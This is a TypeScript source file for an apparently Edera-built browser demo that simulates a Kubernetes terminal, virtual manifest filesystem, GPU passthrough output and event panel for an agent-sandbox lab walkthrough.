          rel="noopener noreferrer"
          style="display:inline-block;padding:14px 30px;border-radius:999px;background:#b8ff3c;color:#081716;font-weight:800;font-size:16px;text-decoration:none;box-shadow:0 10px 30px rgba(184,255,60,.25);"
        >Try our CTF challenge →</a>
      </div>

      <div class="edera-footer">
        <img
          src="https://docs.edera.dev/Ivy%20Headphones.png"
          alt="Ivy from Edera"
          loading="lazy"
        />
        <span>Made with love by the team at <a href="https://edera.dev/love" target="_blank" rel="noopener noreferrer">Edera</a></span>
      </div>

      <!-- Lab completion modal -->
      <div
        id="completion-modal"
        role="dialog"
        aria-modal="true"
        aria-labelledby="completion-title"
        style="position:fixed;inset:0;z-index:1000;display:none;place-items:center;padding:24px;"
      >
        <div
          id="completion-modal-backdrop"
          aria-hidden="true"
          style="position:absolute;inset:0;background:rgba(0,0,0,.72);backdrop-filter:blur(6px);"
        ></div>
        <div
          style="position:relative;width:min(520px,100%);padding:42px;border:1px solid rgba(184,255,60,.35);border-radius:20px;background:#081716;box-shadow:0 24px 80px rgba(0,0,0,.5);text-align:center;"
        >
          <button
            id="completion-close"
            type="button"
            aria-label="Close completion message"
            style="position:absolute;top:12px;right:16px;border:0;background:transparent;color:#a8cfca;font-size:28px;line-height:1;cursor:pointer;"
          >×</button>
          <div style="width:64px;height:64px;margin:0 auto 20px;display:grid;place-items:center;border-radius:50%;background:#b8ff3c;color:#081716;font-size:32px;font-weight:800;">✓</div>
          <div style="margin-bottom:10px;color:#00e5d4;font-size:12px;font-weight:800;letter-spacing:.16em;">LAB COMPLETE</div>
          <h2 id="completion-title" style="margin:0 0 14px;color:#f8fffd;font-size:30px;">Thank you for completing the lab!</h2>
          <p style="margin:0 0 28px;color:#a8cfca;line-height:1.6;">You've completed the Edera Agent Sandbox walkthrough. Ready to try Edera for yourself?</p>
          <div class="completion-actions">
            <button id="restart-demo-btn" type="button" class="completion-restart-btn">Start a new session</button>
            <a href="https://on.edera.dev" target="_blank" rel="noopener noreferrer" class="completion-license-link">Sign up for a free Edera license →</a>
          </div>
        </div>
      </div>

    </div>
  `;

  // Mobile-only layout for the Agent Capabilities panel. Desktop keeps the
  // three-column card; on phones the card stacks into one column, and the
  // count badge and subtitle are hidden so the header fits on one line.
  // !important is needed to override the card's inline styles.
  const capabilityMobileStyles = document.createElement("style");
  capabilityMobileStyles.textContent = `
    @media (max-width: 768px) {
      #capability-count,
      #capabilities-panel .panel-subtitle {
        display: none !important;
      }
      #hide-capabilities-btn {
        margin-left: auto;
      }
      #capabilities-body {
        padding: 10px 12px 12px !important;
      }
      #capabilities-panel .capability-card {
        grid-template-columns: minmax(0, 1fr) !important;
        gap: 10px !important;
      }
      #capabilities-panel .capability-target {
        font-size: 10px;
      }
    }
  `;
  document.head.appendChild(capabilityMobileStyles);

  const output = document.querySelector<HTMLDivElement>("#output")!;
  const input = document.querySelector<HTMLInputElement>("#cmd")!;
  const terminalPrompt =
    document.querySelector<HTMLSpanElement>("#terminal-prompt")!;

  const updateTerminalPrompt = () => {
    terminalPrompt.innerText = `ivy@webernetes:${virtualDisplayPath(currentDirectory)}$`;
  };

  const podGrid = document.querySelector<HTMLDivElement>("#pod-grid")!;
  const podCount = document.querySelector<HTMLSpanElement>("#pod-count")!;
  const podsBodyForLimit = document.querySelector<HTMLDivElement>("#pods-body")!;

  const nodeGrid = document.querySelector<HTMLDivElement>("#node-grid")!;
  const nodeCount = document.querySelector<HTMLSpanElement>("#node-count")!;

  const capabilityGrid =
    document.querySelector<HTMLDivElement>("#capability-grid")!;
  const capabilityCount =
    document.querySelector<HTMLSpanElement>("#capability-count")!;

  const zoneGrid = document.querySelector<HTMLDivElement>("#zone-grid")!;
  const zoneCount = document.querySelector<HTMLSpanElement>("#zone-count")!;

  const eventsStream =
    document.querySelector<HTMLDivElement>("#events-stream")!;
  const guideStepTitle =
    document.querySelector<HTMLDivElement>("#guide-step-title")!;
  const guideDescription =
    document.querySelector<HTMLDivElement>("#guide-description")!;
  const guideCodeStyle = document.createElement("style");
  guideCodeStyle.textContent = `.guide-code { background: #fff3a3; font-weight: 700; padding: 0.08em 0.3em; border-radius: 4px; }`;
  document.head.appendChild(guideCodeStyle);
  const suggestedCommand =
    document.querySelector<HTMLElement>("#suggested-command")!;
  const guideStepList =
    document.querySelector<HTMLDivElement>("#guide-step-list")!;
  const guideProgress =
    document.querySelector<HTMLDivElement>("#guide-progress")!;
  const useCommandBtn =
    document.querySelector<HTMLButtonElement>("#use-command-btn")!;
  const rootShell =
    document.querySelector<HTMLElement>(".demo-shell") || app;
  const mainLayout =
    document.querySelector<HTMLElement>(".main-layout")!;
  const guidePanel =
    document.querySelector<HTMLElement>("#guide-panel")!;
  const eventsPanel =
    document.querySelector<HTMLElement>("#events-panel")!;

  const syncMobilePanelOrder = () => {
    const isMobile = window.matchMedia("(max-width: 768px)").matches;

    if (isMobile) {
      if (eventsPanel.parentElement !== rootShell ||
          eventsPanel.previousElementSibling !== guidePanel) {
        rootShell.insertBefore(eventsPanel, guidePanel.nextSibling);
      }
    } else {
      if (eventsPanel.parentElement !== mainLayout) {
        mainLayout.appendChild(eventsPanel);
      }
    }
  };

  syncMobilePanelOrder();

  const mobileLayoutMediaQuery = window.matchMedia("(max-width: 768px)");
  const handleMobileLayoutChange = () => syncMobilePanelOrder();

  if (typeof mobileLayoutMediaQuery.addEventListener === "function") {
    mobileLayoutMediaQuery.addEventListener("change", handleMobileLayoutChange);
  } else {
    mobileLayoutMediaQuery.addListener(handleMobileLayoutChange);
  }

  window.addEventListener("resize", syncMobilePanelOrder);

  const completionModal =
    document.querySelector<HTMLDivElement>("#completion-modal")!;
  const completionClose =
    document.querySelector<HTMLButtonElement>("#completion-close")!;
  const completionModalBackdrop =
    document.querySelector<HTMLDivElement>("#completion-modal-backdrop")!;
  const restartDemoBtn =
    document.querySelector<HTMLButtonElement>("#restart-demo-btn")!;
  let completionModalShown = false;

  const closeCompletionModal = () => {
    completionModal.hidden = true;
    completionModal.style.display = "none";
  };

  let cluster: Cluster;

  // The demo exposes a small read-only virtual filesystem for manifests. Keeping
  // paths here (rather than making the terminal itself aware of every manifest)
  // lets `ls`, `cd`, `cat`, and `kubectl -f` all share the same path resolution.
  const localFiles: Record<string, string> = {
    [OCAP_GITHUB_MANIFEST_PATH]: OCAP_GITHUB_CAPABILITY,
    "/edera/pod-nginx.yaml": NGINX_YAML_CONTENT,
    "/edera/runtimeclass-edera.yaml": RUNTIMECLASS_EDERA_YAML_CONTENT,
    "/edera/pod-hardened-vessel.yaml": HARDENED_VESSEL_YAML_CONTENT,
    "/edera/nginx-deployment.yaml": NGINX_DEPLOYMENT_YAML_CONTENT,
    "/agent-sandbox/sandbox.yaml": AGENT_SANDBOX_MANIFEST_YAML,
    "/agent-sandbox/template-and-warm-pool.yaml": AGENT_SANDBOX_TEMPLATE_AND_POOL_YAML,
    "/agent-sandbox/edera-sandbox.yaml": EDERA_SANDBOX_YAML,
    "/agent-sandbox/edera-snapshot.yaml": EDERA_SNAPSHOT_YAML,
    "/agent-sandbox/edera-fork.yaml": EDERA_FORK_YAML,

    "/etc/falco/config.d/falco-edera-config.yaml": FALCO_EDERA_CONFIG_YAML,
    "/etc/falco/rules.d/falco-edera-rules.yaml": FALCO_EDERA_RULES_YAML,
    "/falco-edera-values.yaml": FALCO_HELM_VALUES_YAML,

    "/storage/csi/csi-block-pvc.yaml": CSI_BLOCK_PVC_YAML_CONTENT,
    "/storage/csi/format-block-device.yaml": FORMAT_BLOCK_DEVICE_YAML_CONTENT,
    "/storage/csi/csi-block-deployment.yaml": CSI_BLOCK_DEPLOYMENT_YAML_CONTENT,

    "/storage/filesystem/filesystem-pvc.yaml": FILESYSTEM_PVC_YAML_CONTENT,
    "/storage/filesystem/filesystem-deployment.yaml": FILESYSTEM_DEPLOYMENT_YAML_CONTENT,

    "/storage/local-nvme/local-nvme-pv.yaml": LOCAL_NVME_PV_YAML_CONTENT,
    "/storage/local-nvme/local-nvme-pvc.yaml": LOCAL_NVME_PVC_YAML_CONTENT,
    "/storage/local-nvme/local-nvme-deployment.yaml": LOCAL_NVME_DEPLOYMENT_YAML_CONTENT,

    // readme-fetch provider sources (rust/, python/, typescript/).
    ...README_FETCH_SOURCES,

    [CAPABILITY_PROVIDER_PATH]: CAPABILITY_PROVIDER_YAML,
    [KUBERNETES_PROVIDER_PATH]: KUBERNETES_PROVIDER_YAML,
    [SANDBOX_TEMPLATE_PATH]: SANDBOX_TEMPLATE_YAML,
    [SANDBOX_SESSION_PATH]: SANDBOX_SESSION_YAML,
    [SANDBOX_SESSION_DENIED_PATH]: SANDBOX_SESSION_DENIED_YAML,
    [SANDBOX_SDK_PATH]: SANDBOX_SDK_PY,
  };
  const GPU_PCI_LOCATION = "0000:18:00.0";
  const GPU_PCI_ID = "10de:1eb8";
  const GPU_GUEST_PCI_LOCATION = "0000:00:07.0";
  const NVIDIA_KERNEL_VARIANT =
    "ghcr.io/edera-dev/zone-nvidiagpu-kernel:6.18.38-nvidia-610.43.02@sha256:dc968f8664d41abb75e44aa7bb3eb12e02d928c1358e5f1a8435c51d1d30f239";

  const GPU_DAEMON_TOML = `[pci.devices]
[pci.devices.gpu0]
locations = [
  "${GPU_PCI_LOCATION}",
]
permissive = true
msi_translate = false
power_management = true
rdm_reserve_policy = "relaxed"

[zone.kernel-variants]
nvidia = "${NVIDIA_KERNEL_VARIANT}"`;

  const GPU_VFIO_MODPROBE = `options vfio_iommu_type1 allow_unsafe_interrupts
options vfio_pci ids=${GPU_PCI_ID}`;

  const GPU_MODULES_LOAD = `vfio_iommu_type1
vfio_pci`;

  const GPU_LSPCI_UNBOUND = `0000:18:00.0 3D controller [0302]: NVIDIA Corporation TU104GL [Tesla T4] [10de:1eb8] (rev a1)
    Subsystem: NVIDIA Corporation Device [10de:12a2]`;

  const GPU_LSPCI_VFIO = `${GPU_LSPCI_UNBOUND}
    Kernel driver in use: vfio-pci`;

  const NVIDIA_ZONE_LOGS = `[2026-07-16T16:32:21.011030Z INFO  edera_protect_zone::hooks] running setup hook: load modules [nvidia, nvidia_drm, nvidia_uvm] and execute [/usr/bin/nvidia-smi, -pm, 1]
[    1.403876] nvidia: loading out-of-tree module taints kernel.
[    1.515369] nvidia-nvlink: Nvlink Core is being initialized, major device number 239
[    1.516039]
[    1.568563] NVRM: loading NVIDIA UNIX Open Kernel Module for x86_64  610.43.02  Release Build  (build@01c4f9ab348e)  Mon Jul 13 01:02:13 UTC 2026
[    1.619087] nvidia-modeset: Loading NVIDIA UNIX Open Kernel Mode Setting Driver for x86_64  610.43.02  Release Build  (build@01c4f9ab348e)  Mon Jul 13 01:02:08 UTC 2026
[    1.676402] [drm] [nvidia-drm] [GPU ID 0x00000007] Loading driver
[    3.362604] [drm] Initialized nvidia-drm 0.0.0 for 0000:00:07.0 on minor 0`;

  const NVIDIA_WORKLOAD_LSPCI = `0000:00:07.0 3D controller [0302]: NVIDIA Corporation TU104GL [Tesla T4] [10de:1eb8] (rev a1)
    Subsystem: NVIDIA Corporation Device [10de:12a2]
    Kernel driver in use: nvidia`;

  const NVIDIA_SMI_OUTPUT = `+-----------------------------------------------------------------------------------------+
| NVIDIA-SMI 610.43.02              KMD Version: 610.43.02     CUDA UMD Version: 13.3     |
+-----------------------------------------+------------------------+----------------------+
| GPU  Name                 Persistence-M | Bus-Id          Disp.A | Volatile Uncorr. ECC |
| Fan  Temp   Perf          Pwr:Usage/Cap |           Memory-Usage | GPU-Util  Compute M. |
|                                         |                        |               MIG M. |
|=========================================+========================+======================|
|   0  Tesla T4                       On  |   00000000:00:07.0 Off |                    0 |
| N/A   32C    P8             11W /   70W |       0MiB /  15360MiB |      0%      Default |
|                                         |                        |                  N/A |
+-----------------------------------------+------------------------+----------------------+

+-----------------------------------------------------------------------------------------+
| Processes:                                                                              |
|  GPU   GI   CI              PID   Type   Process name                        GPU Memory |
|        ID   ID                                                               Usage      |
|=========================================================================================|
|  No running processes found                                                             |
+-----------------------------------------------------------------------------------------+`;


  const localFileMetadata: Record<
    string,
    { size: number; modified: string }
  > = {
    [OCAP_GITHUB_MANIFEST_PATH]: {
      size: OCAP_GITHUB_CAPABILITY.length,
      modified: "Oct 21 09:00",
    },
    "/edera/pod-nginx.yaml": {
      size: NGINX_YAML_CONTENT.length,
      modified: "Apr  9 07:48",
    },
    "/edera/runtimeclass-edera.yaml": {
      size: RUNTIMECLASS_EDERA_YAML_CONTENT.length,
      modified: "Apr  9 07:48",
    },
    "/edera/pod-hardened-vessel.yaml": {
      size: HARDENED_VESSEL_YAML_CONTENT.length,
      modified: "Apr  9 07:48",
    },
    "/edera/nginx-deployment.yaml": {
      size: NGINX_DEPLOYMENT_YAML_CONTENT.length,
      modified: "Apr  9 07:47",
    },
    "/etc/falco/config.d/falco-edera-config.yaml": {
      size: FALCO_EDERA_CONFIG_YAML.length,
      modified: "Sep  8 09:00",
    },
    "/etc/falco/rules.d/falco-edera-rules.yaml": {
      size: FALCO_EDERA_RULES_YAML.length,
      modified: "Sep  8 09:00",
    },
    "/falco-edera-values.yaml": {
      size: FALCO_HELM_VALUES_YAML.length,
      modified: "Sep  8 09:00",
    },
    "/storage/csi/csi-block-pvc.yaml": { size: CSI_BLOCK_PVC_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/csi/format-block-device.yaml": { size: FORMAT_BLOCK_DEVICE_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/csi/csi-block-deployment.yaml": { size: CSI_BLOCK_DEPLOYMENT_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/filesystem/filesystem-pvc.yaml": { size: FILESYSTEM_PVC_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/filesystem/filesystem-deployment.yaml": { size: FILESYSTEM_DEPLOYMENT_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/local-nvme/local-nvme-pv.yaml": { size: LOCAL_NVME_PV_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/local-nvme/local-nvme-pvc.yaml": { size: LOCAL_NVME_PVC_YAML_CONTENT.length, modified: "Sep  6 09:00" },
    "/storage/local-nvme/local-nvme-deployment.yaml": { size: LOCAL_NVME_DEPLOYMENT_YAML_CONTENT.length, modified: "Sep  6 09:00" },
  };

  const READ_ONLY_FILE_MODE = "-r--r--r--";
  const READ_ONLY_DIRECTORY_MODE = "dr-xr-xr-x";

  let currentDirectory = "/";

  const normalizeVirtualPath = (path: string): string => {
    const parts = path.split("/");
    const normalized: string[] = [];

    for (const part of parts) {
      if (!part || part === ".") {
        continue;
      }
      if (part === "..") {
        normalized.pop();
        continue;
      }
      normalized.push(part);
    }

    return normalized.length > 0 ? `/${normalized.join("/")}` : "/";
  };

  const resolveVirtualPath = (path: string): string => {
    if (!path || path === "~") {
      return currentDirectory;
    }

    if (path === "~/" || path.startsWith("~/")) {
      return normalizeVirtualPath(
        path === "~/" ? "/" : `/${path.slice(2)}`,
      );
    }

    return normalizeVirtualPath(
      path.startsWith("/") ? path : `${currentDirectory}/${path}`,
    );
  };

  const virtualBasename = (path: string): string => {
    const normalized = normalizeVirtualPath(path);
    if (normalized === "/") {
      return "/";
    }
    return normalized.split("/").pop() || "/";
  };

  const virtualDisplayPath = (path: string): string => {
    const normalized = normalizeVirtualPath(path);
    return normalized === "/"
      ? "~"
      : `~${normalized}`;
  };

  const isVirtualDirectory = (path: string): boolean => {
    const normalized = normalizeVirtualPath(path);
    if (normalized === "/") {
      return true;
    }

    const prefix = `${normalized}/`;
    return Object.keys(localFiles).some((file) => file.startsWith(prefix));
  };

  const getVirtualFile = (path: string): string | undefined =>
    localFiles[normalizeVirtualPath(path)];

  const listVirtualDirectory = (path: string): Array<{
    name: string;
    path: string;
    isDirectory: boolean;
  }> => {
    const directory = normalizeVirtualPath(path);
    const prefix = directory === "/" ? "/" : `${directory}/`;
    const entries = new Map<string, { path: string; isDirectory: boolean }>();

    for (const filePath of Object.keys(localFiles)) {
      if (!filePath.startsWith(prefix)) {
        continue;
      }

      const remainder = filePath.slice(prefix.length);
      const slashIndex = remainder.indexOf("/");

      if (slashIndex === -1) {
        entries.set(remainder, {
          path: filePath,
          isDirectory: false,
        });
      } else {
        const directoryName = remainder.slice(0, slashIndex);
        const childPath = normalizeVirtualPath(`${prefix}${directoryName}`);
        entries.set(directoryName, {
          path: childPath,
          isDirectory: true,
        });
      }
    }

    return [...entries.entries()]
      .map(([name, entry]) => ({
        name,
        path: entry.path,
        isDirectory: entry.isDirectory,
      }))
      .sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) {
          return a.isDirectory ? -1 : 1;
        }
        return a.name.localeCompare(b.name);
      });
  };

  const listVirtualTree = (path: string) => {
    const root = normalizeVirtualPath(path);
    const directories = new Set<string>([root]);

    for (const filePath of Object.keys(localFiles)) {
      if (filePath === root || !filePath.startsWith(root === "/" ? "/" : `${root}/`)) {
        continue;
      }

      const relative = filePath.slice(root === "/" ? 1 : root.length + 1);
      const parts = relative.split("/");
      let cursor = root;

      for (let i = 0; i < parts.length - 1; i++) {
        cursor = normalizeVirtualPath(`${cursor}/${parts[i]}`);
        directories.add(cursor);
      }
    }

    const orderedDirectories = [...directories].sort((a, b) => {
      const depthA = a === "/" ? 0 : a.split("/").length;
      const depthB = b === "/" ? 0 : b.split("/").length;
      return depthA - depthB || a.localeCompare(b);
    });

    return orderedDirectories.map((directory) => ({
      directory,
      entries: listVirtualDirectory(directory),
    }));
  };

  const formatVirtualLongEntry = (entry: {
    name: string;
    path: string;
    isDirectory: boolean;
  }) => {
    if (entry.isDirectory) {
      return `${READ_ONLY_DIRECTORY_MODE} 1 ivy 197609        0 Apr  9 07:42 ${entry.name}/`;
    }

    const metadata = localFileMetadata[entry.path] || {
      size: getVirtualFile(entry.path)?.length || 0,
      modified: "Apr  9 07:48",
    };

    return `${READ_ONLY_FILE_MODE} 1 ivy 197609 ${String(metadata.size).padStart(8, " ")} ${metadata.modified} ${entry.name}`;
  };

  const formatVirtualDirectoryHeader = (directory: string) =>
    directory === "/" ? ".:" : `${virtualDisplayPath(directory)}:`;

  const startNewDemoSession = () => {
    completedDemoSteps = new Set<string>();
    selectedDemoStepIndex = null;
    completionModalShown = false;
    commandHistory.length = 0;
    historyIndex = -1;
    protectZones = [];
    protectWorkloads = [];
    persistentVolumeClaims = [];
    persistentVolumes = [];
    jobs = [];
    clusterEvents = [];
    gpuVfioBound = false;
    protectDaemonRestarted = false;
    falcoInstalled = false;
    falcoConfigured = false;
    falcoRulesLoaded = false;
    falcoRunning = false;
    ederaFalcoPluginLoaded = false;
    falcoLogLines = [];
    falcoStreamMode = null;
    agentSandboxVersion = AGENT_SANDBOX_VERSION;
    agentSandboxInstalled = false;
    agentSandboxControllerReady = false;
    agentSandboxCreated = false;
    agentSandboxReady = false;
    agentSandboxTemplateCreated = false;
    agentSandboxWarmPoolCreated = false;
    agentSandboxRouterInstalled = false;
    agentSandboxRouterForwarded = false;
    lastOcapAction = "idle";

    closeCompletionModal();
    window.location.reload();
  };

  let gpuVfioBound = false;
  let protectDaemonRestarted = false;
  let falcoInstalled = false;
  let falcoConfigured = false;
  let falcoRulesLoaded = false;
  let falcoRunning = false;
  let ederaFalcoPluginLoaded = false;
  let falcoLogLines: string[] = [];
  let falcoStreamMode: "node" | "helm" | null = null;

  // The Edera RuntimeClass ships with the Edera install, so it exists from the
  // start; pods that set runtimeClassName: edera are admitted straight away.
  const activeRuntimeClasses = new Set<string>(["edera"]);

  let agentSandboxVersion = AGENT_SANDBOX_VERSION;
  let agentSandboxInstalled = false;
  let agentSandboxControllerReady = false;
  let agentSandboxCreated = false;
  let agentSandboxReady = false;
  let agentSandboxTemplateCreated = false;
  let agentSandboxWarmPoolCreated = false;
  let agentSandboxRouterInstalled = false;
  let agentSandboxRouterForwarded = false;

  type OcapAction =
    | "idle"
    | "allowed"
    | "denied"
    | "credential-blocked";

  let lastOcapAction: OcapAction = "idle";
  // Last result of dialing the workload-published readme capability.
  let lastReadmeAction: "idle" | "allowed" | "denied" | "error" = "idle";
  let lastReadmeRepo = "";

  // A pod's runtimeClassName is only "effective" once that RuntimeClass
  // actually exists in the cluster. Until it's created the pod can't be
  // admitted, so kubectl output treats it as having no runtime class. We use
  // this anywhere runtimeClassName is surfaced (custom-columns, jsonpath,
  // describe) so a pod only reads as `edera` after the user
  // applies edera/runtimeclass-edera.yaml.
  const effectiveRuntimeClass = (pod: LocalPod): string | undefined =>
    pod.runtimeClassName && activeRuntimeClasses.has(pod.runtimeClassName)
      ? pod.runtimeClassName
      : undefined;

  let namespaces: LocalNamespace[] = [
    { name: "default", status: "Active", age: "10m" },
    { name: "kube-system", status: "Active", age: "10m" },
    { name: "kube-public", status: "Active", age: "10m" },
    { name: "kube-node-lease", status: "Active", age: "10m" },
    { name: "edera-runtime", status: "Active", age: "10m" },
  ];

  let deployments: LocalDeployment[] = [];
  let persistentVolumeClaims: LocalPersistentVolumeClaim[] = [];
  let persistentVolumes: LocalPersistentVolume[] = [];
  let jobs: LocalJob[] = [];

  let pods: LocalPod[] = [
  ];

  const ensureCoreClusterPods = () => {
    const corePods: LocalPod[] = [
      {
        name: "edera-runtime-controller-p656l",
        namespace: "edera-runtime",
        status: "Running",
        age: "10m",
        image: "edera/runtime-controller:latest",
        ip: "10.244.0.20",
        node: "node-1",
        labels: { "app.kubernetes.io/name": "edera-runtime-controller-manager" },
      },
      ...[1, 2, 3].map((index) => ({
        name: `kindnet-${index}abc`,
        namespace: "kube-system",
        status: "Running",
        age: "10m",
        image: "kindnet:latest",
        ip: `10.244.${index}.1`,
        node: `node-${index}`,
        labels: { "k8s-app": "kindnet", "kubernetes.io/os": "linux" },
      })),
      ...[1, 2, 3].map((index) => ({
        name: `kube-proxy-${index}xyz`,
        namespace: "kube-system",
        status: "Running",
        age: "10m",
        image: "kube-proxy:latest",
        ip: "<none>",
        node: `node-${index}`,
        labels: { "k8s-app": "kube-proxy", "kubernetes.io/os": "linux" },
      })),
    ];

    for (const corePod of corePods) {
      if (!pods.some((pod) => pod.name === corePod.name && pod.namespace === corePod.namespace)) {
        pods.push(corePod);
      }
    }
  };

  // Seed the system pods up front so the Active Pods panel and
  // `kubectl get pods -A` always describe the same set of pods.
  ensureCoreClusterPods();

  let nodes: LocalNode[] = [
    {
      name: "node-1",
      status: "Ready",
      age: "5m",
      version: "v1.30.0-webernetes",
      internalIp: "172.31.28.21",
      externalIp: "<none>",
      osImage: "Webernetes Linux",
      kernelVersion: "6.18.44-edera-host",
      containerRuntime: "containerd://1.7.18",
      labels: {
        "beta.kubernetes.io/arch": "amd64",
        "beta.kubernetes.io/os": "linux",
        "kubernetes.io/arch": "amd64",
        "kubernetes.io/hostname": "node-1",
        "kubernetes.io/os": "linux",
        "node-role.kubernetes.io/control-plane": "",
        "node.kubernetes.io/exclude-from-external-load-balancers": "",
      },
    },
    {
      name: "node-2",
      status: "Ready",
      age: "5m",
      version: "v1.30.0-webernetes",
      internalIp: "172.31.28.22",
      externalIp: "<none>",
      osImage: "Webernetes Linux",
      kernelVersion: "6.18.44-edera-host",
      containerRuntime: "containerd://1.7.18",
      labels: {
        "beta.kubernetes.io/arch": "amd64",
        "beta.kubernetes.io/os": "linux",
        "kubernetes.io/arch": "amd64",
        "kubernetes.io/hostname": "node-2",
        "kubernetes.io/os": "linux",
        "node-role.kubernetes.io/worker": "",
      },
    },
    {
      name: "node-3",
      status: "Ready",
      age: "5m",
      version: "v1.30.0-webernetes",
      internalIp: "172.31.28.23",
      externalIp: "<none>",
      osImage: "Webernetes Linux",
      kernelVersion: "6.18.44-edera-host",
      containerRuntime: "containerd://1.7.18",
      labels: {
        "beta.kubernetes.io/arch": "amd64",
        "beta.kubernetes.io/os": "linux",
        "kubernetes.io/arch": "amd64",
        "kubernetes.io/hostname": "node-3",
        "kubernetes.io/os": "linux",
        "node-role.kubernetes.io/worker": "",
      },
    },
  ];

  let protectZones: ProtectZone[] = [];
  let protectWorkloads: ProtectWorkload[] = [];
  let cachedProtectImages = new Set<string>([
    "nginx:latest",
    "docker.io/library/alpine:latest",
  ]);
  let clusterEvents: ClusterEvent[] = [];
  const commandHistory: string[] = [];
  let historyIndex = -1;
  let completedDemoSteps = new Set<string>();
  const REQUIRED_DEMO_STEP_IDS = AGENT_SANDBOX_DEMO_STEPS
    .filter((step) => !step.optional)
    .map((step) => step.id);

  const isDemoComplete = (): boolean =>
    REQUIRED_DEMO_STEP_IDS.every((stepId) =>
      completedDemoSteps.has(stepId),
    );

  const showCompletionModal = () => {
    if (completionModalShown || !isDemoComplete()) {
      return;
    }

    completionModalShown = true;

    completionModal.hidden = false;
    completionModal.style.display = "grid";
    completionClose.focus();
  };

  const hideCompletionModal = () => {
    closeCompletionModal();
  };

  closeCompletionModal();
  completionClose.addEventListener("click", hideCompletionModal);
  completionModalBackdrop.addEventListener("click", hideCompletionModal);
  restartDemoBtn.addEventListener("click", startNewDemoSession);
  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !completionModal.hidden) {
      hideCompletionModal();
    }
  });

  const escapeHtml = (str: string) =>
    str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");

  const tokenize = (command: string): string[] => {
    const tokens: string[] = [];
    const regex = /"([^"]*)"|'([^']*)'|(\S+)/g;

    let match: RegExpExecArray | null;

    while ((match = regex.exec(command)) !== null) {
      tokens.push(match[1] ?? match[2] ?? match[3]);
    }

    return tokens;
  };

  const printHtml = (htmlContent: string) => {
    const block = document.createElement("div");
    block.className = "terminal-block";
    block.innerHTML = htmlContent;
    output.appendChild(block);
    output.scrollTop = output.scrollHeight;
  };

  // `<command> | head -n N` (or `| head -N`, `| head`): the only pipe the
  // terminal supports. Returns the command without the pipe.
  const parseHeadPipe = (
    command: string,
  ): { command: string; lines: number } | null => {
    const match = command.match(/^(.+?)\s*\|\s*head(?:\s+(?:-n\s*)?-?(\d+))?\s*$/);
    if (!match) return null;
    return { command: match[1].trim(), lines: match[2] ? Number(match[2]) : 10 };
  };

  // Keep the first `limit` lines across the given output blocks, the way
  // `head` would. A block without <pre> is one line; <pre> blocks are cut at
  // their newlines. Everything after the limit is removed.
  const limitOutputLines = (blocks: Element[], limit: number) => {
    let remaining = limit;
    for (const block of blocks) {
      if (remaining <= 0) {
        block.remove();
        continue;
      }
      if (!block.querySelector("pre")) {
        remaining -= 1;
        continue;
      }
      const walker = document.createTreeWalker(block, NodeFilter.SHOW_TEXT);
      let endsWithNewline = false;
      for (let node = walker.nextNode(); node; node = walker.nextNode()) {
        const text = node.textContent || "";
        if (remaining <= 0) {
          node.textContent = "";
          continue;
        }
        let cut = -1;
        for (let i = 0; i < text.length; i++) {
          if (text[i] === "\n" && --remaining === 0) {
            cut = i;
            break;
          }
        }
        if (cut >= 0) node.textContent = text.slice(0, cut);
        if (text.length) endsWithNewline = text.endsWith("\n");
      }
      // A final line without a trailing newline still counts.
      if (remaining > 0 && !endsWithNewline) remaining -= 1;
    }
  };

  const printPre = (htmlContent: string) => {
    printHtml(`<pre class="terminal-pre">${htmlContent}</pre>`);
  };

  const printCommand = (command: string) => {
    printHtml(
      `<div class="terminal-command"><span class="terminal-prompt">ivy@webernetes:${escapeHtml(virtualDisplayPath(currentDirectory))}$</span> ${escapeHtml(command)}</div>`,
    );
  };

  type TerminalTableCell =
    | string
    | {
        text: string;
        color?: string;
        bold?: boolean;
      };

  const formatTerminalTable = (
    headers: string[],
    rows: TerminalTableCell[][],
    options: {
      minWidths?: number[];
      divider?: boolean;
    } = {},
  ): string => {
    const minWidths = options.minWidths || [];
    const divider = options.divider ?? true;

    const getText = (cell: TerminalTableCell): string =>
      typeof cell === "string" ? cell : cell.text;

    const widths = headers.map((header, index) => {
      const widest = Math.max(
        header.length,
        ...rows.map((row) => getText(row[index] ?? "").length),
      );
      return Math.max(minWidths[index] || 0, widest + 2);
    });

    const renderCell = (cell: TerminalTableCell, width: number): string => {
      const text = getText(cell);
      const padded = text.padEnd(width);

      if (typeof cell === "string") {
        return escapeHtml(padded);
      }

      const styles: string[] = [];
      if (cell.color) styles.push(`color:${cell.color}`);
      if (cell.bold) styles.push("font-weight:700");
      const style = styles.length ? ` style="${styles.join(";")}"` : "";
      return `<span${style}>${escapeHtml(padded)}</span>`;
    };

    const renderRow = (row: TerminalTableCell[]): string =>
      row
        .map((cell, index) => renderCell(cell ?? "", widths[index]))
        .join("")
        .trimEnd();

    const output: string[] = [];
    output.push(
      `<span style="color:#dff7f0;font-weight:700;">${headers
        .map((header, index) => escapeHtml(header.padEnd(widths[index])))
        .join("")
        .trimEnd()}</span>`,
    );

    if (divider) {
      output.push(
        `<span style="color:#08736d;">${"─".repeat(
          Math.max(1, widths.reduce((sum, width) => sum + width, 0) - 2),
        )}</span>`,
      );
    }

    for (const row of rows) {
      output.push(renderRow(row));
    }

    return output.join("\n");
  };

  const addEvent = (
    type: "Normal" | "Warning" | "Info",
    reason: string,
    object: string,
    message: string,
  ) => {
    const time = new Date().toLocaleTimeString().split(" ")[0];

    clusterEvents.unshift({
      time,
      type,
      reason,
      object,
      message,
    });

    renderEvents();
  };

  const renderEvents = () => {
    if (clusterEvents.length === 0) {
      eventsStream.innerHTML = `
        <div class="empty-state">
          No lifecycle events captured yet.
        </div>
      `;
      return;
    }

    eventsStream.innerHTML = clusterEvents
      .map((ev) => {
        const className =
          ev.type === "Warning"
            ? "warning event-warning"
            : ev.type === "Info"
              ? "info event-info"
              : "event-normal";

        return `
          <div class="event-card ${className}">
            <span class="event-time">${escapeHtml(ev.time)}</span>
            <span class="event-badge">${ev.type.toUpperCase()}</span>

